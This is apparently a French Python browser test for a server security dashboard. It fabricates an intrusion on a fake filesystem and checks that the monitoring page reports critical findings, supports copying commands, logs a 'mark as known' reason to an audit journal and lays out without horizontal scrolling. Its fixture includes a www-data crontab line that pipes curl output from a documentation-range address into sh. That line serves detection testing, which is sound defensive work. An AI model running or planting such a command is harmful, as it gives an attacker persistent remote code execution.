"""5.6.101 (lot S) : parcours P101s du banc ``scripts/parcours-navigateur.py`` (vrai navigateur, données fictives, aucun réseau, aucun modèle).

P101s — Sécurité du serveur : un rapport du collecteur ``veille-securite.py`` est produit sur une fausse racine reproduisant l'incident de
novembre 2026 (programme « linuxsys » effacé, lancé depuis /var/www, connecté au port 80 d'une adresse de la plage documentaire ; tâche
planifiée de www-data qui télécharge un script), puis analysé comme le fait la maintenance. On vérifie, à 1920 × 950 puis à 390 px :
état rouge, constat critique, bloc de commandes copiable, « Marquer comme connu » avec motif (inscrit au journal d'audit), bandeau rouge
d'Aujourd'hui (contrat « Sécurité → Aujourd'hui », monté par le lot P), aucun défilement horizontal.
La veille n'existant que sur le serveur Linux, la plateforme est déclarée « serveur » pour la durée du parcours (même processus que le banc).
"""
import importlib.util
import json
from pathlib import Path
import time

SANS_DEFILEMENT = 'document.documentElement.scrollWidth <= window.innerWidth + 1'
RACINE = Path(__file__).resolve().parents[1]


def _nav():
    import __main__ as nav
    return nav


def _collecteur():
    spec = importlib.util.spec_from_file_location('veille_securite_p101s', RACINE / 'deploy' / 'securite' / 'veille-securite.py')
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _fausse_racine(base):
    """Incident fictif minimal (comptes, processus, connexion, tâche planifiée)."""
    def f(chemin, texte):
        p = Path(base) / chemin.lstrip('/')
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(texte, encoding='utf-8')
    f('/etc/passwd', 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmartin:x:1000:1000:MARTIN:/home/martin:/bin/bash\n')
    f('/etc/group', 'root:x:0:\nwww-data:x:33:\nsudo:x:27:martin\n')
    f('/etc/cron.deny', 'www-data\n')
    f('/proc/uptime', '100000.00 1000.00\n')
    f('/proc/loadavg', '3.90 3.80 3.70 1/200 999\n')
    debut, ticks = int((100000 - 7200) * 100), int(0.99 * 7200 * 100)
    f('/proc/4242/stat', '4242 (linuxsys) S 1 4242 4242 0 -1 0 0 0 0 0 %d %d 0 0 20 0 1 0 %d 1 1 1' % (ticks // 2, ticks - ticks // 2, debut))
    f('/proc/4242/exe', '/var/www/.cache/linuxsys (deleted)')
    f('/proc/4242/cmdline', './linuxsys')
    f('/proc/4242/status', 'Name:\tlinuxsys\nUid:\t33\t33\t33\t33\n')
    f('/proc/4242/cgroup', '0::/system.slice/apache2.service\n')
    f('/proc/4242/fd/3', 'socket:[9001]')
    f('/proc/net/tcp', '  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n'
                       '   0: 0A0200C0:C800 327100CB:0050 01 00000000:00000000 00:00000000 00000000    33        0 9001 1\n')
    f('/proc/net/tcp6', '  sl\n')
    f('/var/spool/cron/crontabs/www-data', '*/5 * * * * curl -fsSL http://203.0.113.50/x.sh | sh\n')
    (Path(base) / '.meta.json').write_text('{}', encoding='utf-8')


def p101s_securite(banc, s):
    nav = _nav()
    verifier = nav.verifier
    p = s.page
    sortie = Path(banc.sortie)
    from agent import securite56101
    ancienne = securite56101.plateforme
    securite56101.plateforme = lambda auth=None: 'serveur'
    try:
        V = _collecteur()
        with banc.desk() as d:
            rapports = Path(d.c['state_dir']) / 'securite'
            rapports.mkdir(parents=True, exist_ok=True)
            (Path(d.c['state_dir']) / 'securite-demande').mkdir(exist_ok=True)
            racine = sortie / 'p101s-racine'
            _fausse_racine(racine)
            rapport = V.passer(str(racine), 'complet', time.time(), {}, False, sortie=rapports)
            critiques = {c['id'] for c in rapport['constats'] if c['niveau'] == 'critique'}
            verifier({'S02', 'S03', 'S04', 'S05'} <= critiques, 'constats critiques attendus : %s' % sorted(critiques))
            securite56101.ingerer(d)
        p.set_viewport_size({'width': 1920, 'height': 950})
        s.connecter()
        try:
            p.context.grant_permissions(['clipboard-read', 'clipboard-write'])
        except Exception:   # noqa: BLE001 — navigateur sans permission de presse-papiers : la sélection du texte sert de repli
            pass
        s.aller('/securite-serveur')
        verifier(p.locator('.s101-etat.s101-rouge').count() == 1, 'état rouge absent')
        critique = p.locator('article.s101-constat.s101-n-critique')
        verifier(critique.count() >= 4, 'au moins quatre constats critiques attendus : %d' % critique.count())
        bloc = critique.first.locator('pre')
        verifier(bloc.count() == 1 and 'sudo' in bloc.inner_text(), 'bloc de commandes absent ou vide')
        bouton = critique.first.locator('[data-s101-copier]')
        bouton.click()
        p.wait_for_timeout(300)
        copie = p.evaluate("() => (window.getSelection().toString() || '')")
        verifier(bouton.inner_text().strip() == 'Copié' or 'sudo' in copie, 'la copie des commandes n’a pas eu lieu')
        s.capture(sortie / 'P101s-securite-1920.png')
        verifier(p.evaluate(SANS_DEFILEMENT), 'défilement horizontal à 1920 px')
        # « Marquer comme connu » : motif obligatoire, puis journal d'audit
        cible = p.locator('article.s101-constat:has(h3:has-text("Tâche planifiée du compte de service www-data"))').first
        formulaire = cible.locator('form[data-s101-connu]')
        formulaire.locator('button[type="submit"]').click()
        verifier('motif' in formulaire.locator('.s101-statut').inner_text().lower(), 'le motif vide n’est pas refusé')
        formulaire.locator('textarea').fill('Tâche fictive examinée par le prestataire')
        formulaire.locator('button[type="submit"]').click()
        p.wait_for_function("(el) => el.textContent.indexOf('connu') >= 0", arg=formulaire.locator('.s101-statut').element_handle(), timeout=10000)
        with banc.desk() as d:
            audit = d.db.execute("SELECT data FROM audit WHERE action='securite_serveur_connu' ORDER BY id DESC LIMIT 1").fetchone()
        verifier(audit and json.loads(audit[0]).get('motif') == 'Tâche fictive examinée par le prestataire', '« Marquer comme connu » absent du journal d’audit')
        s.propre('Sécurité du serveur')
        # bandeau rouge d'Aujourd'hui (administrateur)
        s.aller('/aujourdhui')
        bandeau = p.locator('[data-s101-bandeau]')
        verifier(bandeau.count() == 1 and bandeau.first.is_visible(), 'bandeau de sécurité absent d’Aujourd’hui (contrat lot S → lot P)')
        s.capture(sortie / 'P101s-aujourdhui-1920.png')
        # 390 px
        p.set_viewport_size({'width': 390, 'height': 844})
        s.aller('/securite-serveur')
        verifier(p.evaluate(SANS_DEFILEMENT), 'défilement horizontal à 390 px (Sécurité du serveur)')
        s.capture(sortie / 'P101s-securite-390.png')
        s.aller('/aujourdhui')
        verifier(p.evaluate(SANS_DEFILEMENT), 'défilement horizontal à 390 px (Aujourd’hui avec bandeau)')
        s.capture(sortie / 'P101s-aujourdhui-390.png')
        s.propre('Sécurité du serveur à 390 px')
    finally:
        securite56101.plateforme = ancienne
